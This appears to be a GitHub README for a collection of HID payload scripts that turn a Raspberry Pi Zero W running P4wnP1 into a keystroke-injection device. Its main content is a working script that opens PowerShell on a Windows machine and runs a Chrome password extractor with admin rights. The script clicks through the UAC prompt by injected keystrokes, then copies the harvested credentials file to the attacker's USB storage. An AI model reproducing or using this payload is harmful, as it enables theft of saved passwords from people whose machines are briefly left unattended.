# HID-Payload-Injecting-Tool-Scripts
# HID Payload Injecting Tool Scripts

This project is a collection of HID (Human Interface Device) payload scripts designed to automate post-exploitation tasks using a Raspberry Pi Zero W running the **P4wnP1 A.L.O.A.** operating system.

## ⚙️ Project Overview

Using P4wnP1, this tool turns a Raspberry Pi Zero W into a HID attack device capable of injecting pre-defined keystrokes into a target machine. The main script provided in this repo focuses on **extracting saved passwords from Google Chrome on Windows** and saving the results back to the attacker's USB mass storage.

---

## 🛠️ Setup Instructions

### 1. Hardware & OS

- **Hardware:** Raspberry Pi Zero W
- **OS:** [P4wnP1 A.L.O.A.](https://github.com/mame82/P4wnP1_aloa)

---

### 2. Requirements

- P4wnP1 setup with HID and USB Mass Storage modules enabled
- `allpy.exe` file (Chrome Password Extractor) from [Z3nithn/Chrome-Password-Extractor](https://github.com/Z3nithn/Chrome-Password-Extractor)
- HID script as described below
- Mass storage setup containing:
  - `allpy.exe`

---

## 💡 How It Works

Once the Raspberry Pi is plugged into a Windows machine:

1. It emulates a keyboard and opens PowerShell using `Win + R`.
2. It detects the USB drive and copies `allpy.exe` from it to the Desktop.
3. Runs `allpy.exe` with administrative privileges.
4. Handles UAC prompt using keystroke automation.
5. Waits for the credentials to be extracted and saved to `output.csv`.
6. Copies the result back to the USB drive (mass storage).

---

## 📜 HID Script Snippet (Example)

```javascript
layout('us');
typingSpeed(0, 0);        

press("GUI r");           
delay(1000);              
type("powershell\n");     
delay(2000);              

type('$usbDrive = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -ExpandProperty DeviceID);\n');
delay(1000);              

type('if ($usbDrive -ne $null) {\n');  
type('  $usbDrivePath = $usbDrive + "\\";\n');
type('  Copy-Item "$usbDrivePath\\allpy.exe" -Destination "$env:USERPROFILE\\Desktop\\Chrome Password.exe" -Force;\n'); 
type('  Start-Process -FilePath "$env:USERPROFILE\\Desktop\\Chrome Password.exe" -WorkingDirectory "$env:USERPROFILE\\Desktop" -Verb RunAs;\n'); 
type('}\n');

delay(15000);
press("TAB");
press("TAB");
press("ENTER");

delay(30000);
press("TAB");
press("TAB");
press("ENTER");

delay(1000);
type('if (Test-Path "$env:USERPROFILE\\Desktop\\output.csv") {\n');
type('  Copy-Item "$env:USERPROFILE\\Desktop\\output.csv" -Destination "$usbDrivePath\\output.csv" -Force;\n');
type('} else {\n');
type('  Write-Host "Error: output.csv not found!";\n');
type('}\n');
